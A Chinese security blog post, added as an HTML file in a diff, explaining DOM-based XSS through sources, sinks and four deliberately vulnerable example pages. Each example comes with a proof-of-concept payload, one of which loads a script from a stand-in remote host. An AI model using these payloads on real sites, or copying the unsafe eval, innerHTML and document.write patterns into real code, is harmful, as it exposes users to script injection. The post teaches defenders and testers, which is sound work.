@@ -1,0 +1,402 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,XSS,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>浅析DOM型XSS [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        浅析DOM型XSS
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-06-25T13:56:15.000Z">
+        2019-06-25
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-DOM简介"><a href="#0x01-DOM简介" class="headerlink" title="0x01 DOM简介"></a>0x01 DOM简介</h2><p>DOM（Document Object Model）即文档对象模型，是HTML和XML文档的编程接口。</p>
+<p>其中HTML DOM定义了所有HTML元素的对象和属性，以及访问它们的方法。换言之，HTML DOM是关于如何获取、修改、添加或删除HTML元素的标准。</p>
+<p>DOM以树结构表达HTML文档。</p>
+<p>下图为HTML DOM树形结构示例：</p>
+<p><img src="/2019/06/25/浅析DOM型XSS/7.png" alt=""></p>
+<h2 id="0x02-DOM型XSS"><a href="#0x02-DOM型XSS" class="headerlink" title="0x02 DOM型XSS"></a>0x02 DOM型XSS</h2><h3 id="为何DOM型XSS"><a href="#为何DOM型XSS" class="headerlink" title="为何DOM型XSS"></a>为何DOM型XSS</h3><p>DOM型XSS是基于DOM文档对象模型的一种漏洞。严格地说，DOM型XSS其实算反射型XSS，区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。</p>
+<p>首先，客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它并不与服务端进行交互而是从客户端获得DOM中的数据（如从URL中获取数据）并在本地执行；其次，浏览器用户可以操纵DOM中的一些对象如URL、location等；因此，当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p>
+<p>如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> pos=<span class="built_in">document</span>.URL.indexOf(<span class="string">"name="</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(<span class="built_in">document</span>.URL.substring(pos,<span class="built_in">document</span>.URL.length)));</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从代码层面看，漏洞形成原因很简单，<code>document.URL</code>获取用户输入，在代码中未经过任何过滤就传递给了<code>document.write</code>输出到当前页面中。</p>
+<p>当我们正常输入name值时页面直接显示输入的内容，F12查看DOM文档可看到输入的内容确实是插入到当前DOM结构中：</p>
+<p><img src="/2019/06/25/浅析DOM型XSS/8.png" alt=""></p>
+<p>也就是说DOM结构我们用户输入可控，当我们输入XSS payload时就会弹框，造成DOM型XSS：</p>
+<p><img src="/2019/06/25/浅析DOM型XSS/9.png" alt=""></p>
+<h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><p>从挖洞角度看，任何漏洞都是从外部输入加上危险的操作导致的，这里DOM型XSS也不例外。</p>
+<p>DOM型XSS中，其外部输入是JS中存在获取外部输入内容的可利用的代码如URL栏内容的location.href，然后该外部输入内容在未经过有效过滤的情况下就传入危险的输出函数直接输出到页面中或传入eval等危险执行函数就会在页面上直接解析恶意JS代码，导致DOM型XSS的存在。</p>
+<p>下面列下外部输入Sources和危险敏感操作Sinks（包括执行/输出页面），而对于DOM型XSS漏洞挖掘来说，可以简单归纳为在客户端加载的JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。</p>
+<h4 id="Sources"><a href="#Sources" class="headerlink" title="Sources"></a>Sources</h4><ul>
+<li>document.URL</li>
+<li>document.URLUnencoded</li>
+<li>document.location（及其许多属性）</li>
+<li>document.referrer</li>
+<li>window.location（及其许多属性）</li>
+<li>location</li>
+<li>location.href</li>
+<li>location.search</li>
+<li>location.hash</li>
+<li>location.pathname</li>
+</ul>
+<h4 id="Sinks"><a href="#Sinks" class="headerlink" title="Sinks"></a>Sinks</h4><h5 id="直接执行脚本类"><a href="#直接执行脚本类" class="headerlink" title="直接执行脚本类"></a>直接执行脚本类</h5><ul>
+<li>eval(…)</li>
+<li>window.execScript(…)</li>
+<li>window.setInterval(…)</li>
+<li>window.setTimeout(…)</li>
+</ul>
+<h5 id="写HTML页面类"><a href="#写HTML页面类" class="headerlink" title="写HTML页面类"></a>写HTML页面类</h5><ul>
+<li>document.write(…)</li>
+<li>document.writeln(…)</li>
+<li>element.innerHTML(…)</li>
+</ul>
+<h5 id="直接修改DOM类"><a href="#直接修改DOM类" class="headerlink" title="直接修改DOM类"></a>直接修改DOM类</h5><ul>
+<li>document.forms[0].action=… (and various other collections)</li>
+<li>document.attachEvent(…)</li>
+<li>document.create…(…)</li>
+<li>document.execCommand(…)</li>
+<li>document.body. … (accessing the DOM through the body object)</li>
+<li>window.attachEvent(…)</li>
+</ul>
+<h5 id="替换文档URL类"><a href="#替换文档URL类" class="headerlink" title="替换文档URL类"></a>替换文档URL类</h5><ul>
+<li>document.location=… (and assigning to location’s href, host and hostname)</li>
+<li>document.location.hostname=…</li>
+<li>document.location.replace(…)</li>
+<li>document.location.assign(…)</li>
+<li>document.URL=…</li>
+<li>window.navigate(…)</li>
+</ul>
+<h5 id="打开-修改窗口类"><a href="#打开-修改窗口类" class="headerlink" title="打开/修改窗口类"></a>打开/修改窗口类</h5><ul>
+<li>document.open(…)</li>
+<li>window.open(…)</li>
+<li>window.location.href=… (and assigning to location’s href, host and hostname)</li>
+</ul>
+<p>当然，除此之外，还有比较细节的特性这里就不列举了，可自行研究。</p>
+<h2 id="0x03-收集的一些例子"><a href="#0x03-收集的一些例子" class="headerlink" title="0x03 收集的一些例子"></a>0x03 收集的一些例子</h2><p>下面将一些遇到的题目案例做个简单的归纳，小结下常见的几种DOM型XSS场景。</p>
+<h3 id="location-hash-eval"><a href="#location-hash-eval" class="headerlink" title="location.hash+eval"></a>location.hash+eval</h3><p>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。当其作为可控参数传入eval()时则会存在DOM型XSS漏洞。</p>
+<p>dom_xss.php，eval()执行location.hash提取出来的内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSdemo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">eval</span>(<span class="built_in">decodeURI</span>(location.hash.substr(<span class="number">1</span>)))</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>根据location.hash属性，在URL栏输入如下内容尝试往页面写入恶意js代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#document.write(&quot;&lt;script&gt;alert(&apos;hacked by mi1k7ea&apos;)&lt;/script&gt;&quot;)</span><br></pre></td></tr></table></figure>
+<p>在Chrome下会被拦截，因为Chrome自带的XSS过滤机制：</p>
+<p><img src="/2019/06/25/浅析DOM型XSS/1.png" alt=""></p>
+<p>放到Firefox中是没问题的：</p>
+<p><img src="/2019/06/25/浅析DOM型XSS/2.png" alt=""></p>
+<p>为了使Chrome下也生效，我们在自己的服务端放置一个恶意JS文件：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">"Hacked by Mi1k7ea :) "</span>)</span><br></pre></td></tr></table></figure>
+<p>然后改下poc远程加载恶意JS即可在Chrome上执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#document.write(&quot;&lt;script/src=http://a.com/7ea.js&gt;&lt;/script&gt;&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/25/浅析DOM型XSS/3.png" alt=""></p>
+<h3 id="location-search-innerHTML"><a href="#location-search-innerHTML" class="headerlink" title="location.search+innerHTML"></a>location.search+innerHTML</h3><p>innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。</p>
+<p><strong>注意：innerHTML中嵌入script标签是不会执行JS代码的，可以使用img等标签替代。</strong></p>
+<p>案例源自：<a href="https://brutelogic.com.br/tests/sinks.html" target="_blank" rel="noopener">https://brutelogic.com.br/tests/sinks.html</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span>Hello, guest!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> currentSearch = <span class="built_in">document</span>.location.search;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> searchParams = <span class="keyword">new</span> URLSearchParams(currentSearch);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="comment">/*** Document Sink ***/</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> username = searchParams.get(<span class="string">'name'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">if</span> (username !== <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">'p1'</span>).innerHTML = <span class="string">'Hello, '</span> + username + <span class="string">'!'</span>;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过document.location.search获取当前 URL 的查询部分（问号 ? 之后的部分）；然后获取其中的name参数，若name参数不为空则通过innerHTML嵌入到页面中。</p>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;img%20src=x%20onerror=alert(/dom/)&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/25/浅析DOM型XSS/4.png" alt=""></p>
+<h3 id="location-search-document-location"><a href="#location-search-document-location" class="headerlink" title="location.search+document.location"></a>location.search+document.location</h3><p>location指示了其所连接对象的url位置。Document和window对象中都有location属性，可以通过window.location和document.location访问。</p>
+<p>案例源自：<a href="https://brutelogic.com.br/tests/sinks.html" target="_blank" rel="noopener">https://brutelogic.com.br/tests/sinks.html</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span>Hello, guest!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> currentSearch = <span class="built_in">document</span>.location.search;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> searchParams = <span class="keyword">new</span> URLSearchParams(currentSearch);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="comment">/*** Location Sink ***/</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> redir = searchParams.get(<span class="string">'redir'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">if</span> (redir !== <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.location = redir;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从URL栏获取redir参数，判断不为空则赋值给document.location。而document.location会是页面跳转到输入的新的URL位置即更换访问的URL路径。此时可通过js伪协议实现DOM型XSS攻击。</p>
+<p>payload如下，直接通过javascript伪协议实现XSS注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redir=javascript:alert(/dom/)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/25/浅析DOM型XSS/5.png" alt=""></p>
+<h3 id="location-search-eval"><a href="#location-search-eval" class="headerlink" title="location.search+eval"></a>location.search+eval</h3><p>eval() 函数计算 JavaScript 字符串，并把它作为脚本代码来执行。</p>
+<p>案例源自：<a href="https://brutelogic.com.br/tests/sinks.html" target="_blank" rel="noopener">https://brutelogic.com.br/tests/sinks.html</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span>Hello, guest!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> currentSearch = <span class="built_in">document</span>.location.search;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> searchParams = <span class="keyword">new</span> URLSearchParams(currentSearch);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="comment">/*** Execution Sink ***/</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> nasdaq = <span class="string">'AAAA'</span>;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> dowjones = <span class="string">'BBBB'</span>;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> sp500 = <span class="string">'CCCC'</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> market = [];</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> index = searchParams.get(<span class="string">'index'</span>).toString();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="built_in">eval</span>(<span class="string">'market.index='</span> + index);</span></span><br><span class="line"><span class="undefined">	</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.getElementById(<span class="string">'p1'</span>).innerHTML = <span class="string">'Current market index is '</span> + market.index + <span class="string">'.'</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里获取URL栏的index值，然后调用eval()将该值赋给market.index，最后通过innerHTML将market.index的值输出到页面中。</p>
+<p>本段代码问题在于参数index是直接传入eval()中，并未经过任何过滤，因此可直接输入恶意JS语句造成DOM型XSS。payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?index=alert(/7ea/)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/25/浅析DOM型XSS/6.png" alt=""></p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://www.webappsec.org/projects/articles/071105.html" target="_blank" rel="noopener">DOM Based Cross Site Scripting</a></p>
+<p><a href="https://www.scip.ch/en/?labs.20171214" target="_blank" rel="noopener">DOM BASED CROSS SITE SCRIPTING CLIENT-SIDE ATTACKS ON BROWSERS</a></p>
+<p><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/7.html" target="_blank" rel="noopener">那些年我们一起学XSS</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-DOM简介"><span class="toc-text">0x01 DOM简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-DOM型XSS"><span class="toc-text">0x02 DOM型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#为何DOM型XSS"><span class="toc-text">为何DOM型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#挖掘思路"><span class="toc-text">挖掘思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Sources"><span class="toc-text">Sources</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sinks"><span class="toc-text">Sinks</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#直接执行脚本类"><span class="toc-text">直接执行脚本类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#写HTML页面类"><span class="toc-text">写HTML页面类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#直接修改DOM类"><span class="toc-text">直接修改DOM类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#替换文档URL类"><span class="toc-text">替换文档URL类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#打开-修改窗口类"><span class="toc-text">打开/修改窗口类</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-收集的一些例子"><span class="toc-text">0x03 收集的一些例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#location-hash-eval"><span class="toc-text">location.hash+eval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#location-search-innerHTML"><span class="toc-text">location.search+innerHTML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#location-search-document-location"><span class="toc-text">location.search+document.location</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#location-search-eval"><span class="toc-text">location.search+eval</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-text">0x04 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/06/21/PHP弱类型小结/" rel="next" title="PHP弱类型及相关函数Bypass小结">
+          PHP弱类型及相关函数Bypass小结
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/" rel="prev" title="从一道CTF题看如何通过本地DTD文件利用XXE实现回显">
+            从一道CTF题看如何通过本地DTD文件利用XXE实现回显
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
